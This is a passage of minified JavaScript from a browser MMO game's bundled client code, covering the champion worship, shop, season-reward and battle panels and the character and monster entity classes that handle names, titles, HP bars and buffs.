0:e.count),this.getIcon.source=this.getIcon0.source=c.GlobalFun.getItemSource(null===(i=f.reward[0])||void 0===i?void 0:i.id);for(var g=0,m=0,v="",y=n.worshipNum+1;y<=n.worshipNum+this.costNum;y++)d[y]&&d[y].cost&&(g+=d[y].cost[0].count,v||(v=c.GlobalFun.getItemSource(d[y].cost[0].id))),d[y]&&d[y].reward&&(m+=d[y].reward[0].count);this.moneyIcon0.source=v,this.costLabel0.text=""+g,this.getLabel0.text=""+m}else this.get1.visible=this.get2.visible=this.cost1.visible=this.cost2.visible=!1;this.desc.text=gettext("第{0}届诸神之战{1}冠军",h.StringUtils.NumberToChinese(n.worshipNo),o.groupName[0]),this.isEff&&this.playYHEff()}},e.prototype.playYHEff=function(){this.yanHuaMc&&(this.yanHuaMc.stop(),this.yanHuaMc=null),this.yanHuaMc=new o.MovieClip,this.yanHuaMc.x=270,this.yanHuaMc.y=335,this.addChildAt(this.yanHuaMc,this.numChildren+1),this.yanHuaMc.playFile(RES_DIR_EFF+"FireWork",2),this.isEff=!1},e.prototype.onTouch=function(t){var e=p.HegemonyCT.ins();switch(t.target){case this.shipBtn:if(!e.leftWordship)return void u.TipsCT.ins().showTips(gettext("今日膜拜次数已用完！"));if(f.BagCT.ins().getAllSurplusCount(1)<=0)return void u.TipsCT.ins().showTips(gettext("背包已满，请前往清理"));this.isEff=!0,e.sendWorship(1);break;case this.shipBtn0:if(!e.leftWordship)return void u.TipsCT.ins().showTips(gettext("今日膜拜次数已用完！"));if(f.BagCT.ins().getAllSurplusCount(1)<=0)return void u.TipsCT.ins().showTips(gettext("背包已满，请前往清理"));this.isEff=!0,e.sendWorship(this.costNum);break;case this.roleGrp:s.ReadPlayerCT.ins().sendFindPlayer(e.player,e.curServer)}},e.prototype.openOtherPlayerView=function(t){if(this.descGroup.visible?this.info.text=t.serverId+t.name+t.guildName+"":this.info.text="",this._openOtherWin&&!p.HegemonyCT.ins().isOpenView)win.open("RRoleWin",t),this._openOtherWin=!1;else if(p.HegemonyCT.ins().championNO==p.HegemonyCT.ins().worshipNo){this.name0.text="S."+t.serverId+t.name;var e=t.roleData[0];if(e){this.roleItem.visible=!0,this.roleImg.source="job"+(e.job-1);var i={name:t.name,level:t.level,job:e.job,outward:e.outward,titleID:e.titleID,wingID:e.wingID,demonCirID:e.demonCirID};this.roleItem.data=i}}},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=p.HegemonyCT.ins().serverId&&p.HegemonyCT.ins().player;return i||u.TipsCT.ins().showTips(gettext("未决出冠军")),i},e}(n.BaseView);e.HChampionPanel=g,window.HChampionPanel=g,__reflect(g.prototype,"HChampionPanel",[]),window.HChampionPanel=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HMarketPanel=void 0;var n=i(55),o=i(1),s=i(0),a=i(6),r=i(7),l=i(46),h=i(982),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="HSPeakMarketSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.listView.itemRenderer=h.HMarketItem,this.dataArr=new eui.ArrayCollection,this.listView.dataProvider=this.dataArr},e.prototype.addDisplay=function(){this.observe(l.HegemonyCT.ins().postInitShop,this.updateData),this.observe(l.HegemonyCT.ins().postHegemonyShop,this.updateData),this.updateData()},e.prototype.updateData=function(){var t=[];for(var e in s.GlobalConfig.LFRaceStore){var i=s.GlobalConfig.LFRaceStore[e];if(!i.opendayLimit||!(i.opendayLimit[0]>r.GameServerCC.serverOpenDay+1||i.opendayLimit[1]<r.GameServerCC.serverOpenDay+1)){var o=!0;i.foreverLimit&&l.HegemonyCT.ins().shopData[e]>=i.foreverLimit&&(o=!1),o&&t.push(i)}}t.sort(function(t,e){return n.Algorithm.sortAscAttr(t,e,"sort")}),this.dataArr.replaceAll(t);var h=s.GlobalConfig.LFRaceStore[1].costItem[0].id;this.myLabel.text=a.BagCT.ins().getBagGoodsCountById(a.BagCT.BAG_TYPE_OTHTER,h)+"";var u=s.GlobalConfig.ItemConfig[h];this.eIcon.source=u?RES_DIR_ITEMICON+u.icon+".png":""},e}(o.BaseView);e.HMarketPanel=u,window.HMarketPanel=u,__reflect(u.prototype,"HMarketPanel",[]),window.HMarketPanel=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HMarketItem=void 0;var n=i(18),o=i(19),s=i(5),a=i(3),r=i(0),l=i(6),h=i(10),u=i(2),p=i(46),d=function(t){function e(){var e=t.call(this)||this;return e.goodsID=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.buyBtn.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this),observe(this,this.update,l.BagCT.ins().postItemChange),observe(this,this.update,l.BagCT.ins().postItemAdd),observe(this,this.update,l.BagCT.ins().postItemDel),this.itemIcon.showNum(!1),this.dataChanged()},e.prototype.dataChanged=function(){this.skin&&this.data&&this.update()},e.prototype.update=function(){if(this.skin&&this.data){var t=this.data;if(t){this.goodsID=t.goods[0].id;var e=r.GlobalConfig.ItemConfig[this.goodsID];if(e){t.costItem&&t.costItem[0]&&this.cost.setData(t.costItem[0],!1),this.itemName.text=e.name,this.itemName.textColor=h.ItemUtil.getQualityColor(h.ItemUtil.getQuality2(e)),this.num.text=t.goods[0].count+"",this.isShowTips=!1,this.itemIcon.data=e.id,this.usage.text=t.use?"（"+t.use+"）":"",this.myTimes.visible=!1;
var i=p.HegemonyCT.ins().shopData[t.index];i=i?i:0;var o;if(i>=t.dayLimit?(o=n.ColorUtil.RED,this.isShowTips=!0):o=n.ColorUtil.GREEN,t.dayLimit){this.myTimes.visible=!0;var a=gettext("每日限购")+":|C:"+o+"&T:"+i+"|/"+t.dayLimit;this.myTimes.textFlow=s.TextFlowMaker.generateTextFlow1(a)}else if(t.foreverLimit){this.myTimes.visible=!0;var a=gettext("永久限购")+":|C:"+o+"&T:"+i+"|/"+t.foreverLimit;this.myTimes.textFlow=s.TextFlowMaker.generateTextFlow1(a)}}}}},e.prototype.onClick=function(){if(this.isShowTips)return void u.TipsCT.ins().showTips("|C:0xff0000&T:"+gettext("今日已无兑换次数，请明日再来")+"|");if(l.BagCT.ins().getAllSurplusCount(1)<=0)return void u.TipsCT.ins().showTips(gettext("背包已满，请前往清理"));var t=this.data;t&&(t.costItem&&t.costItem[0]&&!o.GlobalFun.checkCost(t.costItem[0].count,t.costItem[0].id)||p.HegemonyCT.ins().sendBuyItem(t.index,1))},e}(a.BaseItemRender);e.HMarketItem=d,window.HMarketItem=d,__reflect(d.prototype,"HMarketItem",[]),window.HMarketItem=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HRewardsPanel=void 0;var n=i(1),o=i(0),s=i(984),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="HSSeasonRewardsSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this._listDt1=new eui.ArrayCollection,this.list1.itemRenderer=s.HRewardsItem,this.list1.dataProvider=this._listDt1},e.prototype.addDisplay=function(){var t=[],e=o.GlobalConfig.LfRaceRankAward;for(var i in e){var n=e[i];for(var s in n)t.push(n[s])}this._listDt1.replaceAll(t)},e}(n.BaseView);e.HRewardsPanel=a,window.HRewardsPanel=a,__reflect(a.prototype,"HRewardsPanel",[]),window.HRewardsPanel=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HRewardsItem=void 0;var n=i(3),o=i(77),s=i(152),a=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=o.ItemBaseNoName,this.addTouchEvent(this.btnCompass,this.onClick),this.dataChanged()},e.prototype.dataChanged=function(){if(this.skin&&this.data){var t=this.data;if(t){this.list.dataProvider=new eui.ArrayCollection(t.awards),this.imgBg.source="zssz_reawrdBg"+t.type,this.imgTitle.source="title_"+t.type+"_"+t.rank;var e=s.CompassCT.ins().getRewardByCfg(t.type,t.rank);this.btnCompass.icon=null===e||void 0===e?void 0:e.img}}},e.prototype.onClick=function(t){var e=this.data;e&&win.open("CompassRewardWin",e.type,e.rank)},e}(n.BaseItemRender);e.HRewardsItem=a,window.HRewardsItem=a,__reflect(a.prototype,"HRewardsItem",[]),window.HRewardsItem=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HSBattleFbUI=void 0;var n=i(8),o=i(5),s=i(1),a=i(34),r=i(37),l=i(0),h=i(4),u=i(986),p=i(7),d=i(46),c=i(993),f=i(995),g=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="HSBattleSkin",e.isChange=!1,e.role1=[],e.role2=[],e.roleMax1=[],e.roleMax2=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.headList1.itemRenderer=c.HSBattleFbItem,this.headList2.itemRenderer=c.HSBattleFbItem,this.rList1.itemRenderer=f.HSFbTeamItem,this.rList2.itemRenderer=f.HSFbTeamItem,this.updateUI()},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(d.HegemonyCT.ins().postFightInfo,this.updateUI),this.observe(d.HegemonyCT.ins().postCurRound,this.update),this.observe(d.HegemonyCT.ins().postRoundEnd,this.update),this.observe(d.HegemonyCT.ins().postRoundEnd,this.refresList),this.observe(d.HegemonyCT.ins().postCountdown,this.setTime),this.update(),this.setTime(),Timer.has(this.setTime,this)||Timer.start(1e3,0,this.setTime,this)},e.prototype.removeDisplay=function(){Timer.stop(this.setTime,this)},e.prototype.updateUI=function(){var t=d.HegemonyCT.ins();this.name1.textFlow=o.TextFlowMaker.generateTextFlow1("s"+t.server1+"."+t.roleName1),this.name2.textFlow=o.TextFlowMaker.generateTextFlow1("s"+t.server2+"."+t.roleName2);var e=l.GlobalConfig.LfRaceBase;if(this.quali1.source=e.battleImg[1],this.quali2.source=e.battleImg[0],t.state==d.HegemonyStatus.Challenge){var i=t.challengeData;if(!i[0])return;i[0].beChoose==t.role2&&(this.name1.textFlow=o.TextFlowMaker.generateTextFlow1("s"+t.server2+"."+t.roleName2),this.name2.textFlow=o.TextFlowMaker.generateTextFlow1("s"+t.server1+"."+t.roleName1),this.quali1.source=e.battleImg[0],this.quali2.source=e.battleImg[1],this.isChange=!0)}this.update()},e.prototype.update=function(){if(this.skin){var t=d.HegemonyCT.ins();this.round.text=gettext("回合{0}",t.curRound);var e=l.GlobalConfig.LFRaceTime[t.state],i=[],n=[];if(e&&e.fightJob){var o=e.fightJob,s=1,a=void 0,r=void 0,h=t.fightList[t.fightNumber];if(h&&h[s])for(var u in h[s])(t.state==d.HegemonyStatus.Challenge&&h[s][u].serverId==t.challengeData[0].beServer&&h[s][u].name==t.challengeData[0].beChooseName||t.state!=d.HegemonyStatus.Challenge&&1==+u)&&(a=h[s][u].result),(t.state==d.HegemonyStatus.Challenge&&h[s][u].serverId==t.challengeData[0].server&&h[s][u].name==t.challengeData[0].challengerName||t.state!=d.HegemonyStatus.Challenge&&2==+u)&&(r=h[s][u].result);i.push([o[s],this.isChange?t.roleSex2:t.roleSex1,t.curRound==+s,a,+s<t.curRound]),n.push([o[s],this.isChange?t.roleSex1:t.roleSex2,t.curRound==+s,r,+s<t.curRound])}this.headList1.dataProvider=new eui.ArrayCollection(i),this.headList2.dataProvider=new eui.ArrayCollection(n)}},e.prototype.refresList=function(){var t=r.EntityManager.ins().getAllEntity();for(var e in t){var i=t[e].infoModel;t[e]instanceof u.CharRole&&(i.isMy?(this.role1[i.job]=t[e].getRealHp(),this.roleMax1[i.job]=t[e].infoModel.getAtt(a.AttributeType.atMaxHp)||0):(this.role2[i.job]=t[e].getRealHp(),this.roleMax2[i.job]=t[e].infoModel.getAtt(a.AttributeType.atMaxHp)||0))}var n=d.HegemonyCT.ins(),o=[],s=[],p=this.isChange?n.roleSex2:n.roleSex1,c=this.isChange?n.roleSex1:n.roleSex2,f=n.state==d.HegemonyStatus.Challenge&&n.challengeData[0].beChoose==h.ActorCC.actorID||n.state!=d.HegemonyStatus.Challenge&&n.role1==h.ActorCC.actorID?this.role1:this.role2,g=n.state==d.HegemonyStatus.Challenge&&n.challengeData[0].beChoose==h.ActorCC.actorID||n.state!=d.HegemonyStatus.Challenge&&n.role1==h.ActorCC.actorID?this.role2:this.role1,m=f==this.role1?this.roleMax1:this.roleMax2,v=g==this.role2?this.roleMax2:this.roleMax1,y=l.GlobalConfig.LFRaceTime[n.state];if(y&&y.fightJob){var C=y.fightJob;for(var T in C[n.curRound]){var b=C[n.curRound][T];o.push([b,p[b-1],f[b],m[b]]),s.push([b,c[b-1],g[b],v[b]])}}this.rList1.dataProvider=new eui.ArrayCollection(o),this.rList2.dataProvider=new eui.ArrayCollection(s)},e.prototype.setTime=function(){this.refresList();var t="",e=d.HegemonyCT.ins();1==e.countdownType?t=gettext("秒后开始战斗"):2==e.countdownType?t=gettext("秒后结束战斗"):3==e.countdownType&&(t=gettext("秒后开始下一场战斗")),this.desc.text=t;var i=Math.floor((n.DateUtils.formatMiniDateTime(e.countdown)-p.GameServerCC.serverTime)/1e3);i=0>=i?0:i,this.countDown.text=i+""},e}(s.BaseView);e.HSBattleFbUI=g,window.HSBattleFbUI=g,__reflect(g.prototype,"HSBattleFbUI",[]),window.HSBattleFbUI=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CharRole=void 0;var n=i(34),o=i(0),s=i(20),a=i(154),r=i(161),l=i(32),h=i(122),u=i(28),p=i(38),d=i(7),c=i(85),f=i(26),g=i(4),m=i(95),v=i(987),y=function(t){function e(){var e=t.call(this)||this;return e.zhanLingAttack=!1,e.touchEnabled=!1,e.touchChildren=!1,e._nameTxt.textColor=16777215,e._nameGroup.visible=!0,e}return __extends(e,t),e.prototype.loadOther=function(e){if(this.action==h.EntityAction.DIE){if(e!=m.CharMcOrder.BODY&&e!=m.CharMcOrder.WEAPON){var i=this.getMc(e);return void(i&&(i.visible=!1))}}else{var i=this.getMc(e);i&&(i.visible=!0)}(e!=m.CharMcOrder.ZHANLING||!this.zhanLingAttack&&this._state!=h.EntityAction.ATTACK)&&t.prototype.loadOther.call(this,e)},e.prototype.loadBody=function(){t.prototype.loadBody.call(this)},e.prototype.getResDir=function(t){if(t==m.CharMcOrder.ZHANLING)return 3;var e=2*(this._dir-4);if(0>e&&(e=0),d.GameServerCC.serverOpenDay<7)return this._dir-e;var i=this._dir-e;return 2>i?1:3},e.prototype.updateBlood=function(e){var i=this;void 0===e&&(e=!1),t.prototype.updateBlood.call(this,e),this._hpBar.hp<=0?this.onDead(function(){i.deadDelay()}):this.action==h.EntityAction.DIE&&this.playAction(h.EntityAction.STAND)},e.prototype.parseModel=function(){this.updateBlood(!0),this.updateNeiGong(),this.updateTitle(),this.updateNameColor()},e.prototype.updateNameColor=function(){var t=this.infoModel;t.camp>0&&a.BattleCC.ins().isBattle()?this.setNameTxtColor(t.camp!=a.BattleCC.ins().camp?16711680:65280):this.setNameTxtColor(16777215)},e.prototype.updateNeiGong=function(){this.infoModel&&(this._hpBar.currentState=this.infoModel.getHpState(),this._hpBar.setProgress(this.infoModel.getAtt(n.AttributeType.cruNeiGong),2,this.infoModel.getAtt(n.AttributeType.maxNeiGong)))},e.prototype.updateTitle=function(){var t=this.infoModel,e=t.title;if(this.removeTitle(),!(this.isMy&&c.Setting.ins().getValue(c.ClientSet.shTitle)||!this.isMy&&c.Setting.ins().getValue(c.ClientSet.shOtherTitle))&&this.getIsShowBody()&&e>0){var i=o.GlobalConfig.TitleConf[e];if(i)if(i.img)null==this._title&&(this._title=new eui.Image,this._title.anchorOffsetX=115,this._title.anchorOffsetY=100,this.titleCantainer.addChild(this._title)),this._title.source=RES_DIR_CHENGHAO+i.img;else if(i.eff){null==this._titleMc&&(this._titleMc=ObjectPool.pop("MovieClip"),this._titleMc.anchorOffsetX=0,this._titleMc.anchorOffsetY=80,this.titleCantainer.addChild(this._titleMc));var n=RES_DIR_EFF+i.eff;this.playFile(this._titleMc,n)}}},e.prototype.wearTitle=function(){var t=this.infoModel;if(!t.title){var e,i=o.GlobalConfig.GuideTitleConfig;null==this._title&&(this._title=new eui.Image,this._title.anchorOffsetX=115,this._title.anchorOffsetY=100,this.titleCantainer.addChild(this._title));for(var n in i){switch(i[n].type){case 1:e=l.FbCT.ins().guanqiaID>=1e5?0:l.FbCT.ins().guanqiaID;break;case 2:e=g.ActorCC.level;break;case 3:e=f.ZsCT.ins().stage}if(e<i[n].task)return void(this._title.source=RES_DIR_CHENGHAO+i[n].img);this._title.source=""}}},e.prototype.setCharName=function(e){t.prototype.setCharName.call(this,e),this._nameGroup.visible=!0},e.prototype.playZhanLingAttack=function(){var t=this,e=m.CharMcOrder.ZHANLING,i=this.getMc(e);if(i){var n=this.getFileName(e);this.zhanLingAttack=!0,egret.Tween.get(i).to({scaleX:.5,scaleY:.5,alpha:1},300).call(function(){egret.Tween.get(i).to({scaleX:.55,scaleY:.55},100).call(function(){egret.Tween.get(i).to({scaleX:.5,scaleY:.5},100)})}),i.playFile(n,1,function(){t.zhanLingAttack=!1;var n=t.getFileName(e);i.playFile(n,-1,null,!1)},!1)}},e.prototype.reset=function(){t.prototype.reset.call(this),this.zhanLingAttack=!1},e.prototype.destruct=function(){this._hpBar.visible=this._nameGroup.visible=!0,this._nameTxt.textColor=16777215},e.prototype.deadDelay=function(){this.stopMove(),this.removeHardStraight(),this.removeAllBuff(),this._title&&(this._title.source=""),this._hpBar.visible=this._nameGroup.visible=!1,this.atking=!1,Timer.stopAll(this),v.CharMonster.die(this)},e.prototype.showBodyContainer=function(){this.isShowBody||t.prototype.showBodyContainer.call(this)},e.prototype.hideBodyContainer=function(){this.isShowBody&&t.prototype.hideBodyContainer.call(this)},e.prototype.isSafety=function(){var t={x:s.GameMap.point2Grip(this.x),y:s.GameMap.point2Grip(this.y)};return s.GameMap.checkSafety(t)},e.prototype.onDead=function(t){this.stopMove(),this.playAction(h.EntityAction.DIE,t)},e.prototype.stopMove=function(){},e.prototype.addDisplay=function(){var e=this;t.prototype.addDisplay.call(this);var i=this.infoModel;if(this.isMy){observe(this,function(t){var n=t[0],o=t[1];n==i.index&&(2==o&&e.shBody(!0),0==o&&e.shWeapon(!0))},p.EquipCT.ins().postEquipChange),observe(this,function(){e.shBody(!0),e.shWeapon(!0)},r.Dress.ins().postDressInfo),observe(this,function(){},Ts.wingBoost.levelup),observe(this,function(t){t!=i.index});var n=u.Guild.ins();observe(this,function(){i.guildID=n.guildID,i.guildName=n.guildName,e.setCharName(i.guildAndName)},n.postQuitGuild,n.postGuildInfo)}this._hpBar.currentState=this.infoModel.getHpState(),this.setCharName(i.guildAndName),this.shWeapon(!0)},e.prototype.settingUpdate=function(){t.prototype.settingUpdate.call(this),this.updateTitle()},e.prototype.removeDisplay=function(){t.prototype.removeDisplay.call(this),this.shWeapon(!1)},e.prototype.shBody=function(t){if(!t||!this.isShowBody)return void this.clearMc(m.CharMcOrder.BODY);var e=this.infoModel,i=e.equipsData[2].item.configID,n="";i>0&&o.GlobalConfig.EquipConfig[i]&&(n=o.GlobalConfig.EquipConfig[i].appearance),n=n||"000",n+="_"+e.sex,this.addMc(m.CharMcOrder.BODY,RES_DIR_BODY+n)},e.prototype.shWeapon=function(t){if(!t||!this.isShowBody)return this.clearMc(m.CharMcOrder.WEAPON),void this.clearMc(m.CharMcOrder.SOUL);var e=this.infoModel,i=e.getEquipByIndex(0).item.configID,n="";return i>0&&o.GlobalConfig.EquipConfig[i]&&(n=o.GlobalConfig.EquipConfig[i].appearance),(n=n||"")?(n+=o.GlobalConfig.ClientGlobalConfig.useManRes?"_0":"_"+e.sex,void this.addMc(m.CharMcOrder.WEAPON,RES_DIR_WEAPON+n)):(this.clearMc(m.CharMcOrder.WEAPON),void this.clearMc(m.CharMcOrder.SOUL))},e}(v.CharMonster);e.CharRole=y,window.CharRole=y,__reflect(y.prototype,"CharRole",[]),window.CharRole=y},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CharMonster=void 0;var n=i(255),o=i(21),s=i(988),a=i(0),r=i(5),l=i(122),h=i(95),u=i(34),p=i(20),d=i(16),c=i(85),f=i(137),g=i(241),m=i(989),v=i(194),y=i(991),C=function(t){function e(){var e=t.call(this)||this;e._hpBar=new y.EntityHp,e.filterDic={},e.myKill=!1,e.isShowBody=!0,e.canMove=!1,e.touchEnabled=!0,e.touchChildren=!1,e.buffList={},e.buffEff={},e.damageOverTimeList={},e.effs={},e._hpBar.visible=!1,e._nameGroup=new eui.Group,e._nameGroup.touchEnabled=!1,e._nameGroup.height=30,e._nameGroup.width=260,e._nameGroup.anchorOffsetY=Math.floor(e._nameGroup.height+2),e._nameGroup.anchorOffsetX=Math.floor(e._nameGroup.width>>1);var i=new eui.HorizontalLayout;return i.horizontalAlign="center",i.verticalAlign="bottom",e._nameGroup.layout=i,e.titleCantainer.addChild(e._nameGroup),e._nameTxt=new eui.Label,e._nameTxt.textAlign="center",e._nameTxt.size=14,e._nameTxt.stroke=1,e._nameTxt.strokeColor=0,e._nameTxt.textColor=16722731,e._nameGroup.addChild(e._nameTxt),e}return __extends(e,t),e.prototype.setCharName=function(t){this._nameTxt.textFlow=r.TextFlowMaker.generateTextFlow(t)},e.prototype.setNameTxtColor=function(t){this._nameTxt.textColor=t},e.prototype.playAction=function(e,i){(this._state!=e||this.isAtkAction())&&(this.hasFilter(s.EntityFilter.hard)&&e!=l.EntityAction.DIE||e==l.EntityAction.DIE&&this.infoModel.type==EntityType.Monster&&a.GlobalConfig.MonstersConfig[this.infoModel.configID]&&4==a.GlobalConfig.MonstersConfig[this.infoModel.configID].type||t.prototype.playAction.call(this,e,i))},e.prototype.stopMove=function(){this.canMove=!1,v["default"].stop(this)},Object.defineProperty(e.prototype,"dir",{get:function(){if(this.infoModel){var t=this.infoModel.getDir();return 0>t?this._dir:t}return this._dir},set:function(t){this._dir==t||this.hasFilter(s.EntityFilter.hard)||this._state!=l.EntityAction.DIE&&(this._dir=t,this.loadBody())},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"action",{get:function(){return this._state},set:function(t){this._state!=l.EntityAction.DIE&&(this._state=t)},enumerable:!1,configurable:!0}),e.prototype.getResDir=function(t){var e=2*(this._dir-4);0>e&&(e=0);var i=this._dir-e;return this.infoModel&&2!=this.infoModel.dirNum?i:2>i?1:3},Object.defineProperty(e.prototype,"moveSpeed",{get:function(){return this.infoModel?this.infoModel.getAtt(u.AttributeType.atMoveSpeed)/1e3*p.GameMap.CELL_SIZE:0},enumerable:!1,configurable:!0}),e.prototype.getRealHp=function(){return this.infoModel.getAtt(u.AttributeType.atHp)},e.prototype.reset=function(){this._state=l.EntityAction.STAND,this.dir=4,this.myKill=!1,this.removeAllFilters()},e.prototype.deadDelay=function(){this.removeHardStraight();for(var t in this.damageOverTimeList){var i=this.damageOverTimeList[t];this.deleteDamageOverTimer(i)}this.removeAllBuff(),this.atking=!1,this.haloMc&&d.DisplayUtils.removeFromParent(this.haloMc),e.die(this)},e.die=function(t){return t},e.prototype.addHardStraight=function(t){this.isHardStraight=!0,Timer.start(t,1,this.removeHardStraight,this)},e.prototype.removeHardStraight=function(){this.isHardStraight=!1},Object.defineProperty(e.prototype,"isPlaying",{get:function(){return this._body.isPlaying},enumerable:!1,configurable:!0}),e.prototype.isAtkAction=function(){return this._state==l.EntityAction.ATTACK||this._state==l.EntityAction.CAST},e.prototype.loadBody=function(){this.isShowBody&&t.prototype.loadBody.call(this)},e.prototype.loadOther=function(e){this.isShowBody&&t.prototype.loadOther.call(this,e)},e.prototype.showBodyContainer=function(){this.isShowBody||(this.isShowBody=!0,this.addChildAt(this._bodyContainer,1),this.loadBody(),this.updateTitle())},e.prototype.hideBodyContainer=function(){this.isShowBody&&(this.isShowBody=!1,this.removeChild(this._bodyContainer),this.updateTitle())},e.prototype.getIsShowBody=function(){return this.isShowBody},e.prototype.resetStand=function(){this.isAtkAction()&&this.playAction(l.EntityAction.STAND)},e.prototype.updateBlood=function(t){void 0===t&&(t=!1),this.infoModel&&this._hpBar.setProgress(this.infoModel.getAtt(u.AttributeType.atHp),1,this.infoModel.getAtt(u.AttributeType.atMaxHp))},e.prototype.updateTitle=function(){var t=this.infoModel,e=a.GlobalConfig.MonstersConfig[t.configID],i=e&&e.titleId;if(this.removeTitle(),this.getIsShowBody()&&i&&i>0){var n=a.GlobalConfig.MonsterTitleConf[i];if(n)if(n.img)null==this._title&&(this._title=new eui.Image,this._title.anchorOffsetX=115,this.titleCantainer.addChild(this._title)),n.anchorOffsetY?this._title.anchorOffsetY=n.anchorOffsetY:this._title.anchorOffsetY=100,this._title.source=RES_DIR_CHENGHAO+n.img;else if(n.eff){null==this._titleMc&&(this._titleMc=ObjectPool.pop("MovieClip"),this._titleMc.anchorOffsetX=0,this.titleCantainer.addChild(this._titleMc));var o=RES_DIR_EFF+n.eff;this.playFile(this._titleMc,o),n.anchorOffsetY?this._titleMc.anchorOffsetY=n.anchorOffsetY:this._titleMc.anchorOffsetY=80}}},e.prototype.removeTitle=function(){this._title&&(this._title.source=""),this._titleMc&&(d.DisplayUtils.removeFromParent(this._titleMc),this._titleMc=null)},e.prototype.onDead=function(t){this.stopMove(),this.showBlood(!1),this.removeTitle(),this.playAction(l.EntityAction.DIE),t&&Timer.start(300,1,t,this)},e.prototype.damageOverTime=function(t){var e=t instanceof egret.Timer?t:t.currentTarget;e.currentCount==e.repeatCount&&this.deleteDamageOverTimer(e)},e.prototype.deleteDamageOverTimer=function(t){for(var e in this.damageOverTimeList)this.damageOverTimeList[e]==t&&(delete this.damageOverTimeList[e],t.stop(),t.removeEventListener(egret.TimerEvent.TIMER,this.damageOverTime,this))},e.prototype.addEffect=function(t){var e=a.GlobalConfig.EffectConfig[t];if(e){if(0==e.type){var i=new eui.Image;i.source=e.fileName,this.addChild(i);var n=egret.Tween.get(i);return i.x=i.x-23,void n.to({y:-100},2e3).call(function(){d.DisplayUtils.removeFromParent(i)})}if(1==e.type){var o=ObjectPool.pop("MovieClip"),s=RES_DIR_EFF+e.fileName;return o.playFile(s),void this.addChild(o)}var r=this.effs[t]||ObjectPool.pop("MovieClip"),l=RES_DIR_SKILLEFF+e.fileName;this.playFile(r,l),this.addChild(r),this.effs[t]=r}},e.prototype.$setX=function(e){return this.haloMc&&(this.haloMc.x=e),this._hpBar.x=e,this.updateAlpha(),t.prototype.$setX.call(this,e)},e.prototype.$setY=function(e){return this.haloMc&&(this.haloMc.y=e),this._hpBar.y=e-130,this.updateAlpha(),t.prototype.$setY.call(this,e)},e.prototype.updateAlpha=function(){this.alpha=p.GameMap.checkAlpha(this.x,this.y)?.5:1},e.prototype.addDisplay=function(){t.prototype.addDisplay.call(this),this.settingUpdate(),observe(this,this.settingUpdate,c.Setting.ins().setValue);var e=this.infoModel.nameColor;e&&this.setNameTxtColor(e),this.parent.addChild(this._hpBar)},e.prototype.removeDisplay=function(){t.prototype.removeDisplay.call(this),this.shBody(!1),this.shHalo(!1)},e.prototype.settingUpdate=function(){this.shBody(!0),this.shHalo(!0)},e.prototype.shHalo=function(t){if(!t)return d.DisplayUtils.removeFromParent(this.haloMc),void(this.haloMc=null);var e=this.infoModel.effect;e&&(this.haloMc=this.haloMc||new o.MovieClip,this.haloMc.x=this.x,this.haloMc.y=this.y,this.playFile(this.haloMc,RES_DIR_EFF+a.GlobalConfig.EffectConfig[e].fileName),f.DropHelp.dropContainer.addChildAt(this.haloMc,0))},e.prototype.shBody=function(t){var e=this.infoModel.isClient;if(!this.isMy&&e&&(t=t&&!c.Setting.ins().getValue(c.ClientSet.shMonster)),t){var i=this.infoModel.avatarFileName;this.addMc(h.CharMcOrder.BODY,RES_DIR_MONSTER+i)}else this.clearMc(h.CharMcOrder.BODY)},e.prototype.removeEffect=function(t){var e=a.GlobalConfig.EffectConfig[t];if(e&&0!=e.type){var i=this.effs[t];i&&(d.DisplayUtils.removeFromParent(i),delete this.effs[t])}},e.prototype.removeAllEffect=function(){for(var t in this.effs){var e=this.effs[t];e&&d.DisplayUtils.removeFromParent(e)}this.effs={}},e.prototype.hasBuff=function(t){return!!this.buffList[t]},e.prototype.addBuff=function(t){var e=t.effConfig,i=e.group,n=this.buffList[i];if(n&&(2==n.effConfig.overlayType&&(t.multRate=n.multRate+1),this.removeBuff(n)),this.buffList[i]=t,e.effName&&this.isShowBody){var o=this.buffEff[i]||ObjectPool.pop("MovieClip"),s=RES_DIR_SKILLEFF+e.effName;this.playFile(o,s),this.addChild(o),this.buffEff[i]=o}if(e.effID&&this.addEffect(e.effID),t.effConfig.type==g.SkillEffType.AdditionalState&&t.effConfig.args&&9==t.effConfig.args.i){var a=t.effConfig.duration;this.addHardStraight(a)}this.addGroup(i)},e.prototype.removeBuff=function(t){var e=t.effConfig,i=e.group;if(this.buffList[i]==t&&(t.dispose(),ObjectPool.push(this.buffList[i]),delete this.buffList[i],this.buffEff[i]&&(d.DisplayUtils.removeFromParent(this.buffEff[i]),delete this.buffEff[i]),e.effID&&this.removeEffect(e.effID),e.unionBuff))for(var n in e.unionBuff){var o=this.buffList[e.unionBuff[n]];o&&this.removeBuff(o)}this.removeGroup(i)},e.prototype.removeAllBuff=function(){for(var t in this.buffList)this.removeBuff(this.buffList[t])},e.prototype.addPaoPao=function(t){this.paoPao||(this.paoPao=new m.PaoPaoView),this.addChildAt(this.paoPao,100),this.paoPao.anchorOffsetY=170,this.paoPao.anchorOffsetX=100;var e=1;this.paoPao.setSpeak(t,e)},e.prototype.playCount=function(){return 